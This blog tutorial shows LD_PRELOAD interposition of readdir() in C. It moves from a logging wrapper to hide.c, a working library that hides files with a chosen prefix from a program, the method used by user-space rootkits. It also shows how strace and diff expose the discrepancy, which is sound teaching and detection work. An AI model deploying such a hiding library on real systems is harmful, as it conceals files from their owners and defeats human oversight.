---
title: "Linux hacking part 12: LD_PRELOAD function interposition. Simple C examples"
date:  2026-10-26 02:00:00 +0200
header:
  teaser: "/assets/images/230/2026-10-27_01-21.png"
categories:
  - linux
tags:
  - red team
  - linux
  - malware
  - hooking
  - dynamic linking
---

﷽

Hello, cybersecurity enthusiasts and white hackers!    

![linux](/assets/images/230/2026-10-27_01-21.png){:class="img-responsive"}    

In the [previous part](/linux/2026/06/17/linux-hacking-11.html), we looked at redirecting a function call through the GOT/PLT. This time, let's return to `LD_PRELOAD` and look more closely at function interposition: a shared library can provide a function with the same name as one used by a dynamically linked program.    

We will build a small directory-listing program and a library that wraps `readdir()`. The wrapper will log every entry and then return it unchanged. We will compare that log with the program output and with the `getdents64` system call shown by `strace`. The lab demonstrates where an interposed function sits in the call path without changing files or hiding entries.    

### concept

The dynamic linker loads shared objects before starting a dynamically linked program. `LD_PRELOAD` asks it to load a specified shared object before the program's ordinary dependencies, which lets symbols in that object take part in symbol resolution. `LD_PRELOAD` is ignored or restricted in secure-execution mode, so the behavior depends on how the program is started. See [`ld.so(8)`](https://man7.org/linux/man-pages/man8/ld.so.8.html).    

An interposer can call `dlsym(RTLD_NEXT, "readdir")` to find the next definition of `readdir()` after its own. It can then inspect the result and pass it back to the application. `RTLD_NEXT` is specifically meant for this kind of wrapper. See [`dlsym(3)`](https://man7.org/linux/man-pages/man3/dlsym.3.html).    

A user-space rootkit can abuse the same boundary to filter what a selected application receives. That changes the application's view of directory entries; comparing it with evidence from a lower layer can help reveal the difference. In this lab, the wrapper only records entries and forwards them unchanged.    

`readdir()` is a C library interface that returns one directory entry at a time. At the system-call layer, Linux uses `getdents64()` to return a buffer containing directory entries. `strace` can show that system call and its results. See [`readdir(3)`](https://man7.org/linux/man-pages/man3/readdir.3.html), [`getdents(2)`](https://man7.org/linux/man-pages/man2/getdents.2.html), and [`strace(1)`](https://man7.org/linux/man-pages/man1/strace.1.html).    

### practical example 1

First, let's create a tiny program that lists a directory. It calls `opendir()` once and then repeatedly calls `readdir()` until there are no more entries.    

The important part is the loop:

```cpp
struct dirent *entry;

while ((entry = readdir(dir)) != NULL) {
  printf("%s\n", entry->d_name);
}
```

Now we can add a wrapper library. It resolves the next `readdir()` implementation in a constructor, before `main()` starts:

```cpp
__attribute__((constructor))
static void audit_init(void) {
  dlerror();
  next_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
  if (dlerror() != NULL) {
    next_readdir = NULL;
  }
}
```

Our wrapper calls the original function and logs the entry it returned. It does not modify the entry or suppress it:

```cpp
struct dirent *readdir(DIR *dir) {
  if (next_readdir == NULL) {
    errno = ENOSYS;
    return NULL;
  }

  struct dirent *entry = next_readdir(dir);

  if (entry != NULL) {
    int saved_errno = errno;
    fprintf(stderr, "[audit] readdir returned: %s\n", entry->d_name);
    errno = saved_errno;
  }

  return entry;
}
```

We preserve `errno` around the log call so that writing the audit message does not alter the caller's view of the `readdir()` result. If the original function could not be resolved, the wrapper returns an error instead of calling a null pointer.    

Now the complete program (`meow.c`):

```cpp
/*
 * meow.c
 * lists the contents of a directory
 * author: @cocomelonc
 */

#include <dirent.h>
#include <errno.h>
#include <stdio.h>

int main(int argc, char **argv) {
  const char *path = argc > 1 ? argv[1] : ".";
  DIR *dir = opendir(path);
  if (dir == NULL) {
    perror("opendir");
    return 1;
  }

  int result = 0;
  for (;;) {
    errno = 0;
    struct dirent *entry = readdir(dir);
    if (entry == NULL) {
      if (errno != 0) {
        perror("readdir");
        result = 1;
      }
      break;
    }

    printf("%s\n", entry->d_name);
  }

  if (closedir(dir) != 0) {
    perror("closedir");
    result = 1;
  }

  return result;
}
```

And the complete interposer (`audit.c`):

```cpp
/*
 * audit.c
 * logs readdir() results and passes them through unchanged
 * author: @cocomelonc
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdio.h>

static struct dirent *(*next_readdir)(DIR *);

__attribute__((constructor))
static void audit_init(void) {
  dlerror();
  next_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
  if (dlerror() != NULL) {
    next_readdir = NULL;
  }
}

struct dirent *readdir(DIR *dir) {
  if (next_readdir == NULL) {
    errno = ENOSYS;
    return NULL;
  }

  struct dirent *entry = next_readdir(dir);
  if (entry != NULL) {
    int saved_errno = errno;
    fprintf(stderr, "[audit] readdir returned: %s\n", entry->d_name);
    errno = saved_errno;
  }

  return entry;
}
```

### demo 1

Let's create a small test directory:      

```bash
mkdir -p lab
printf 'meow-meow demo\n' > lab/meow.txt
printf 'meow notes\n' > lab/notes.txt
```

![linux](/assets/images/230/2026-10-27_00-01.png){:class="img-responsive"}    

compile `meow.c`:     

```bash
gcc -Wall -Wextra -o meow meow.c
```

![linux](/assets/images/230/2026-10-27_00-03.png){:class="img-responsive"}    

and compile interposer:    

```bash
gcc -Wall -Wextra -fPIC -shared -o audit.so audit.c -ldl
```

![linux](/assets/images/230/2026-10-27_00-03_1.png){:class="img-responsive"}    

First, run the directory lister without the interposer:

```bash
./meow ./lab
```

The program prints the directory entries, including `meow.txt` and `notes.txt`. The order of entries is filesystem-dependent.    

![linux](/assets/images/230/2026-10-27_00-05.png){:class="img-responsive"}    

Now start only this program with our audit library:

```bash
LD_PRELOAD="$PWD/audit.so" ./meow ./lab
```

The program still prints the same entries. The library writes one `[audit]` line to standard error for each entry returned by `readdir()`. This confirms that the call passed through our wrapper and that the wrapper forwarded the original result.    

![linux](/assets/images/230/2026-10-27_00-48.png){:class="img-responsive"}    

### practical example 2

The library log shows what the `readdir()` wrapper saw. To observe the lower layer, we can trace `getdents64()` with `strace`. The system call returns directory-entry records to the process; the C library then exposes those entries through `readdir()`.    

Run the same program through `strace`:

```bash
strace -e trace=getdents64 -s 160 env LD_PRELOAD="$PWD/audit.so" ./meow ./lab
```

In the trace, look for the `getdents64()` call and the names in its returned buffer. The audit lines show the entries as the interposed C library function returns them, while the normal program output shows what `main()` prints. In this lab the three views agree because our wrapper only logs.    

![linux](/assets/images/230/2026-10-27_00-51.png){:class="img-responsive"}    

### demo 2

Run the traced command and compare the names in the `getdents64()` result, the `[audit]` messages, and the program's standard output. You should see the same set of entries in each place. `strace` traces system calls and signals, which makes it useful for checking what crossed the user/kernel boundary.

Note that `getdents64()` appears twice in the trace:

```bash
getdents64(3, 0x555a736fb2d0 /* 4 entries */, 32768) = 112
...
getdents64(3, 0x555a736fb2d0 /* 0 entries */, 32768) = 0
```

The first call fills the libc buffer with every entry in our small directory at once (`.`, `..`, `meow.txt`, `notes.txt`), which is why all four `[audit]` lines come from a single system call. The second call returns `0 entries`, and that empty result is how the C library detects the end of the directory: at that point `readdir()` returns `NULL` and our loop stops. A larger directory would simply trigger more `getdents64()` calls before the final empty one.

This gives us a useful defensive check: if a program's directory listing disagrees with the entries returned by the kernel, investigate which library code and process environment shaped the result. A mismatch alone is not proof of a rootkit; applications can filter or transform data for legitimate reasons too.

### practical example 3

So far the wrapper only logged. Now let's make it do what a real user-space rootkit does: hide a file from the application without touching the filesystem. This is the classic trick used by `LD_PRELOAD` rootkits such as [Jynx2](https://github.com/chokepoint/Jynx2), [Azazel](https://github.com/chokepoint/azazel), and [bedevil](https://github.com/Error996/bdvl).

The idea is simple. `readdir()` returns one entry per call, so our wrapper keeps asking the original function for the next entry and silently skips any whose name starts with a chosen prefix. From the application's point of view those entries never existed:

```cpp
struct dirent *readdir(DIR *dir) {
  for (;;) {
    struct dirent *entry = next_readdir(dir);
    if (entry == NULL) {
      return NULL;
    }

    if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
      continue; // skip this entry, fetch the next one
    }

    return entry;
  }
}
```

Here is the complete filtering interposer (`hide.c`):

```cpp
/*
 * hide.c
 * hides directory entries whose name starts with "secret_"
 * author: @cocomelonc
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>

#define HIDE_PREFIX "secret_"

static struct dirent *(*next_readdir)(DIR *);

__attribute__((constructor))
static void hide_init(void) {
  dlerror();
  next_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
  if (dlerror() != NULL) {
    next_readdir = NULL;
  }
}

struct dirent *readdir(DIR *dir) {
  if (next_readdir == NULL) {
    errno = ENOSYS;
    return NULL;
  }

  for (;;) {
    struct dirent *entry = next_readdir(dir);
    if (entry == NULL) {
      return NULL;
    }

    if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
      continue; // skip this entry, fetch the next one
    }

    return entry;
  }
}
```

The structure is identical to the audit wrapper. The only difference is that instead of logging each entry and passing it through, we loop and drop the ones that match `HIDE_PREFIX`, returning only the entries we want the application to see.

### demo 3

Add a file that matches the prefix to our lab directory:    

```bash
printf 'meow meow. top secret\n' > lab/secret_passwords.txt
```

![linux](/assets/images/230/2026-10-27_01-03.png){:class="img-responsive"}    

and build the new library:    

```bash
gcc -Wall -Wextra -fPIC -shared -o hide.so hide.c -ldl
```

![linux](/assets/images/230/2026-10-27_01-06.png){:class="img-responsive"}     

First confirm the file is really there, without the interposer:

```bash
./meow ./lab
```

The listing now includes `secret_passwords.txt` along with `meow.txt` and `notes.txt`.

![linux](/assets/images/230/2026-10-27_01-07.png){:class="img-responsive"}     

Now run the same program with the filtering library preloaded:

```bash
LD_PRELOAD="$PWD/hide.so" ./meow ./lab
```

Meow! This time `secret_passwords.txt` is gone from the output, even though the file was never deleted. The wrapper simply never handed that entry back to `main()`.

![linux](/assets/images/230/2026-10-27_01-08.png){:class="img-responsive"}     

Finally, trace the system calls to see the mismatch directly:

```bash
strace -e trace=getdents64 -s 160 env LD_PRELOAD="$PWD/hide.so" ./meow ./lab
```

The kernel still returns every entry in the `getdents64()` buffer, but the program's output no longer contains `secret_passwords.txt`:     

![linux](/assets/images/230/2026-10-27_01-16.png){:class="img-responsive"}     

```bash
getdents64(3, 0x56264b53d2d0 /* 5 entries */, 32768) = 152 # this 5 entries: ., .., meow.txt, notes.txt, secret_passwords.txt     
.
..
meow.txt
notes.txt
getdents64(3, 0x56264b53d2d0 /* 0 entries */, 32768) = 0
+++ exited with 0 +++
```

So, note that `strace` does not print the individual names inside the `getdents64()` buffer; it shows the pointer and an entry count comment. That count is the key: the kernel reports **5 entries** (`.`, `..`, `meow.txt`, `notes.txt`, and the hidden `secret_passwords.txt`), while the program prints only **4** lines. The same lab run without a preloaded library, or with `audit.so`, prints all 5. One entry disappeared between the system call and `main()`, exactly in our wrapper.

To see the hidden name itself rather than just the count, compare against a listing produced without the interposer:     

```bash
# the kernel's view, from a process that does not load hide.so
./meow ./lab | sort > with_file.txt
LD_PRELOAD="$PWD/hide.so" ./meow ./lab | sort > without_file.txt
diff with_file.txt without_file.txt
```

![linux](/assets/images/230/2026-10-27_01-19.png){:class="img-responsive"}     

This is exactly the discrepancy the defensive check from demo 2 looks for: the user-space view and the kernel view disagree, and the difference points straight at the preloaded library. The file is still on disk, still returned by the system call, and still visible to any process that does not load `hide.so`.

### why this matters

`LD_PRELOAD` interposition is a user-space mechanism. It can change what a dynamically linked process receives from a library call, but it does not change the directory itself. Comparing a library-level view with a system-call trace helps explain where that view was produced.    

We went from an audit wrapper that only records entries to a filtering wrapper that hides them, and both use the exact same function boundary. That is the point: the same interposition primitive serves monitoring and offense depending only on what the wrapper decides to do with each entry. Because the hiding happens entirely in user space, comparing the application's view with a system-call trace exposes it immediately.

`LD_PRELOAD` is not applied to every process. Static executables do not use the dynamic linker in the same way, and the loader restricts environment-based preloading in secure-execution mode. The exact behavior also depends on the program's symbols and libraries.    

I hope this simple lab helps explain symbol interposition and the difference between a C library interface and the system call below it.     

[Linux hacking part 11: Function hooking via GOT/PLT overwrite. Simple C examples](/linux/2026/06/17/linux-hacking-11.html)    
[ld.so(8)](https://man7.org/linux/man-pages/man8/ld.so.8.html)    
[dlsym(3)](https://man7.org/linux/man-pages/man3/dlsym.3.html)    
[readdir(3)](https://man7.org/linux/man-pages/man3/readdir.3.html)     
[getdents(2)](https://man7.org/linux/man-pages/man2/getdents.2.html)     
[strace(1)](https://man7.org/linux/man-pages/man1/strace.1.html)    
[source code in github](https://github.com/cocomelonc/meow/tree/master/2026-10-26-linux-hacking-12)    

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!
*PS. All drawings and screenshots are mine*
